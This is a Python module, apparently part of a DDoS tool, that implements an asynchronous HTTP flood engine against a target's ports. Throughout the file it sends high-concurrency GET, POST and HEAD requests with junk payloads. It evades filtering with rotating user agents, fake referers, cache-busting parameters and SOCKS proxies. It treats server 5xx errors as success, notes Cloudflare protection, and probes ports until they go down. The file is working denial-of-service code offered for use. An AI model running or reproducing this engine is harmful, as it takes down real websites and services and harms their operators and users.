import asyncio
import random
import string
import time
from typing import List, Optional
from urllib.parse import urlparse

import aiohttp

from models import AttackMethod, AttackStats, AttackStatus, PortStats, PortStatus
from proxy_pool import proxy_pool
from config import settings


USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:126.0) Gecko/20100101 Firefox/126.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14.5; rv:126.0) Gecko/20100101 Firefox/126.0",
]

REFERERS = [
    "https://www.google.com/search?q=",
    "https://www.bing.com/search?q=",
    "https://duckduckgo.com/?q=",
    "https://yandex.ru/search/?text=",
    "https://www.reddit.com/",
    "https://github.com/",
    "https://stackoverflow.com/",
]


def _junk(min_len: int = 3, max_len: int = 12) -> str:
    return "".join(random.choices(string.ascii_letters + string.digits, k=random.randint(min_len, max_len)))


def _build_headers() -> dict:
    return {
        "User-Agent": random.choice(USER_AGENTS),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": random.choice(["en-US,en;q=0.9", "ru-RU,ru;q=0.9,en;q=0.8"]),
        "Accept-Encoding": "gzip, deflate, br",
        "Referer": random.choice(REFERERS) + _junk(5, 15),
        "Cache-Control": "no-cache",
        "Connection": "keep-alive",
    }


def _build_payload() -> dict:
    return {_junk(5, 10): _junk(100, 500) for _ in range(random.randint(1, 5))}


def _pick_method(method: AttackMethod) -> str:
    if method == AttackMethod.MIX:
        return random.choice(["GET", "POST", "HEAD"])
    return method.value


def _build_url(target: str, port: int) -> str:
    parsed = urlparse(target)
    host = parsed.hostname or target.replace("https://", "").replace("http://", "").split("/")[0].split(":")[0]
    path = parsed.path or "/"
    if port == 443:
        return f"https://{host}{path}"
    elif port == 80:
        return f"http://{host}{path}"
    else:
        return f"https://{host}:{port}{path}"


async def _direct_probe(url: str, timeout: int = 5) -> bool:
    """Direct connection (no proxy) to check if port is actually alive."""
    try:
        async with aiohttp.ClientSession(
            connector=aiohttp.TCPConnector(ssl=False),
            timeout=aiohttp.ClientTimeout(total=timeout),
        ) as session:
            async with session.get(url, headers=_build_headers()) as resp:
                return True
    except Exception:
        return False


class AttackEngine:
    def __init__(self):
        self.stats = AttackStats()
        self._stop_event = asyncio.Event()
        self._task: Optional[asyncio.Task] = None
        self.last_error: str = ""

    @property
    def is_running(self) -> bool:
        return self._task is not None and not self._task.done()

    async def start(self, target: str, ports: List[int], method: AttackMethod, threads: int, duration: int, use_proxies: bool):
        if self.is_running:
            await self.stop()

        self._stop_event.clear()
        self.last_error = ""

        port_stats = {}
        for p in ports:
            port_stats[p] = PortStats(port=p, status=PortStatus.ALIVE)

        self.stats = AttackStats(
            target=target,
            method=method.value,
            status=AttackStatus.RUNNING,
            ports=port_stats,
            threads=threads,
            started_at=time.time(),
            proxies_loaded=proxy_pool.count if use_proxies else 0,
        )
        self._task = asyncio.create_task(self._run(target, ports, method, threads, duration, use_proxies))

    async def stop(self):
        if not self.is_running:
            return
        self.stats.status = AttackStatus.STOPPING
        self._stop_event.set()
        if self._task:
            try:
                await asyncio.wait_for(self._task, timeout=5.0)
            except (asyncio.TimeoutError, asyncio.CancelledError):
                self._task.cancel()
        self.stats.status = AttackStatus.FINISHED

    async def _run(self, target: str, ports: List[int], method: AttackMethod, threads: int, duration: int, use_proxies: bool):
        deadline = time.time() + duration if duration > 0 else 0
        threads_per_port = max(threads // len(ports), 10)

        tasks = []
        for port in ports:
            t = asyncio.create_task(self._attack_port(target, port, method, threads_per_port, deadline, use_proxies))
            tasks.append(t)

        checker = asyncio.create_task(self._health_loop(target, use_proxies))
        tasks.append(checker)

        try:
            await asyncio.gather(*tasks, return_exceptions=True)
        except asyncio.CancelledError:
            pass

        if self.stats.status == AttackStatus.RUNNING:
            if all(ps.status != PortStatus.ALIVE for ps in self.stats.ports.values()):
                self.stats.status = AttackStatus.ALL_DOWN
            else:
                self.stats.status = AttackStatus.FINISHED
        self.stats = self.stats.snapshot()

    async def _attack_port(self, target: str, port: int, method: AttackMethod, threads: int, deadline: float, use_proxies: bool):
        url = _build_url(target, port)
        sem = asyncio.Semaphore(threads)
        timeout = aiohttp.ClientTimeout(total=settings.request_timeout)

        # Часть потоков всегда идёт напрямую (без прокси) для давления + точного определения статуса
        direct_ratio = 0.3 if use_proxies else 1.0

        try:
            while not self._stop_event.is_set():
                if deadline and time.time() >= deadline:
                    break

                ps = self.stats.ports.get(port)
                if not ps or ps.status != PortStatus.ALIVE:
                    await asyncio.sleep(1)
                    continue

                batch_size = min(threads, 80)
                batch = []
                for _ in range(batch_size):
                    use_direct = (random.random() < direct_ratio) or not use_proxies
                    batch.append(self._fire_one(url, port, method, sem, timeout, not use_direct))
                await asyncio.gather(*batch, return_exceptions=True)

        except asyncio.CancelledError:
            pass
        except Exception as e:
            self.last_error = f"Port {port}: {e}"

    async def _fire_one(self, base_url: str, port: int, method: AttackMethod, sem: asyncio.Semaphore, timeout: aiohttp.ClientTimeout, via_proxy: bool):
        async with sem:
            if self._stop_event.is_set():
                return

            ps = self.stats.ports.get(port)
            if not ps or ps.status != PortStatus.ALIVE:
                return

            chosen = _pick_method(method)
            headers = _build_headers()
            buster = f"{'&' if '?' in base_url else '?'}{_junk(3, 6)}={_junk(8, 16)}"
            url = base_url + buster

            connector = None
            is_proxy_fail = False

            try:
                if via_proxy and proxy_pool.count > 0:
                    proxy_url = proxy_pool.random()
                    if proxy_url:
                        try:
                            from aiohttp_socks import ProxyConnector
                            connector = ProxyConnector.from_url(proxy_url)
                        except Exception:
                            connector = None

                async with aiohttp.ClientSession(
                    connector=connector or aiohttp.TCPConnector(limit=0, ssl=False),
                    timeout=timeout,
                ) as session:
                    kwargs = {"method": chosen, "url": url, "headers": headers}
                    if chosen == "POST":
                        kwargs["json"] = _build_payload()

                    async with session.request(**kwargs) as resp:
                        status = resp.status
                        ps.total_requests += 1
                        ps.status_codes[status] = ps.status_codes.get(status, 0) + 1
                        ps.last_response_time = time.time()
                        self.stats.total_requests += 1

                        if status < 400:
                            ps.successful += 1
                            ps.consecutive_fails = 0
                            self.stats.successful += 1
                        elif status >= 500:
                            ps.successful += 1
                            self.stats.successful += 1
                            # 5xx = сервер ещё жив но страдает, не считаем фейлом
                        else:
                            ps.failed += 1
                            self.stats.failed += 1

                        if resp.headers.get("server", "").lower() == "cloudflare":
                            ps.status = PortStatus.PROTECTED

                        if status == 429:
                            await asyncio.sleep(random.uniform(0.5, 2.0))

            except (aiohttp.ClientError, asyncio.TimeoutError, OSError, ConnectionError):
                ps.total_requests += 1
                self.stats.total_requests += 1

                if via_proxy:
                    # Фейл через прокси — не считаем как реальный фейл порта
                    ps.failed += 1
                    self.stats.failed += 1
                else:
                    # Фейл напрямую — это реальный фейл порта
                    ps.failed += 1
                    ps.consecutive_fails += 1
                    self.stats.failed += 1
            except Exception:
                ps.total_requests += 1
                ps.failed += 1
                self.stats.total_requests += 1
                self.stats.failed += 1

    async def _health_loop(self, target: str, use_proxies: bool):
        """Каждые 10 секунд прямой probe на каждый живой порт."""
        await asyncio.sleep(5)

        while not self._stop_event.is_set():
            for port, ps in list(self.stats.ports.items()):
                if ps.status != PortStatus.ALIVE:
                    continue

                url = _build_url(target, port)
                alive = await _direct_probe(url)

                if not alive and ps.consecutive_fails >= 20:
                    # Порт не отвечает напрямую И накопились прямые фейлы
                    ps.status = PortStatus.DOWN

            all_down = all(ps.status != PortStatus.ALIVE for ps in self.stats.ports.values())
            if all_down:
                self._stop_event.set()
                self.stats.status = AttackStatus.ALL_DOWN
                break

            await asyncio.sleep(10)


engine = AttackEngine()
